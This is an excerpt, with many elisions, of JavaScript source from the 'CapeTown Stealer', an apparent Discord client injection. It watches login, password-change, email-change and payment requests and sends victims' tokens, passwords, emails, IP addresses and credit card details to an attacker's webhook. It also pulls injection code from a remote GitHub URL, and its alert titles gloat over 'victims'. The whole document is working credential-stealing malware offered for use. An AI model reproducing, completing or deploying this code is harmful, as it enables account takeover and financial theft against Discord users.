...
var config = {
    ...
    injection_url: "https://raw.githubusercontent.com/CapeTown/CapeTown-Injection/main/index.js",
    webhook: "%WEBHOOK%",
    uwu: "https://panel..net:3000/",
    Filter: {
        "urls": [
...
const makeEmbed = async ({
    ...
    var params = {
        username: "CapeTown Stealer",
        avatar_url: "https://raw.githubusercontent.com/blackkface/Assets/main/CapeTown.png",
        content: "",
        embeds: [{
            title: title,
            ...
            footer: {
                text: "©blackkface | https://github.com/blackkface/CapeTown-Stealer"
            },
...
const FirstTime = async () => {
    ...
    if (fs.existsSync(__dirname + "/CapeTown")) fs.rmdirSync(__dirname + "/CapeTown")
    var ip = await getIP()
    if (!token) {
        var params = await makeEmbed({
            title: "CapeTown Initalized",
            fields: [{
                name: "Injection Info",
                value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\``,
                inline: !1
        ...
        if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/blackkfaceOracle/Assets/main/output-onlinegiftools.gif"
        if (!user.banner) var userBanner = "https://raw.githubusercontent.com/blackkfaceOracle/Assets/main/triquetra-wallpaper-2560x800_59.jpg"
        ...
        var params = await makeEmbed({
            ...
            fields: [{
                ...
                name: "@Copyright",
                value: `[CapeTown 2023 <:CapeTown:1087057809071427695>](https://github.com/CapeTown/CapeTown-Stealer)`,
                inline: !0
            }, {
    ...
    if ((config.logout != "false" || config.logout !== "%LOGOUT%") && config['logout-notify'] == "true") {
        if (!token) {
            var params = await makeEmbed({
                title: "CapeTownised User log out (User not Logged in before)",
                fields: [{
                    name: "Injection Info",
            ...
            userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
            var params = await makeEmbed({
                title: "CapeTown Victim got logged out",
                fields: [{
                    name: "Injection Info",
                    value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
                    inline: !1
...
electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async (request, callback) => {
    ...
    switch (true) {
        case request.url.endsWith("login"):
            ...
            var params = await makeEmbed({
                title: "CapeTown User Login",
                description: "[<:CapeTown:1087057809071427695>  **Oh you have CapeTownised someone**](https://github.com/CapeTown/CapeTown-Stealer)",
                color: config['embed-color'],
                fields: [{
                    name: "Injection Info",
                    value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
        ...
        case request.url.endsWith("users/@me"):
            ...
            if (data.new_password) {
                var params = await makeEmbed({
                    title: "CapeTown Detect Password Changed",
                    description: "[<:CapeTown:1087057809071427695>  **Oh you have CapeTownised someone**](https://github.com/CapeTown/CapeTown-Stealer)",
                    color: config['embed-color'],
                    fields: [{
                        name: "Injection Info",
                        ...
                        name: "Bio <:CapeTown:1087057809071427695>",
                        value: `\`\`\`${user.bio ?? ":x:"}\`\`\``,
                        inline: !1
                    }, {
                        name: "<a:tokens:1041634540537511957> Token",
            ...
            if (data.email) {
                var params = await makeEmbed({
                    title: "CapeTown Detect Email Changed",
                    description: "[<:CapeTown:1087057809071427695>  **Oh you have CapeTownised someone**](https://github.com/CapeTown/CapeTown-Stealer)",
                    color: config['embed-color'],
                    fields: [{
                        name: "Injection Info",
        ...
        case request.url.endsWith("tokens"):
            ...
            var params = await makeEmbed({
                title: "CapeTown User Credit Card Added",
                description: `
                **IP:** ${ip}\n\n
